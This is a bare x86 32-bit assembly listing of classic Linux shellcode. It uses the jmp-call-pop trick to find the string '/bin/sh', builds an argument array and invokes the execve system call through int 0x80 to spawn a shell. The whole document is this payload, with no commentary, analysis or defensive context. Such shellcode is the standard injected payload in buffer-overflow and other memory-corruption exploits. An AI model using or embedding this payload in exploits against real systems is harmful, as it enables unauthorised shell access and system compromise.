BITS 32

jmp short       __end

__start:

 pop            esi
 xor            eax, eax
 mov byte       [esi + 7], al
 lea            ebx, [esi]
 mov long       [esi + 8], ebx
 mov long       [esi + 12], eax
 add            al, 0x0b
 mov            ebx, esi
 lea            ecx, [esi + 8]
 lea            edx, [esi + 12]
 int            0x80

__end:
call            __start
db              '/bin/sh$XXXXNULL'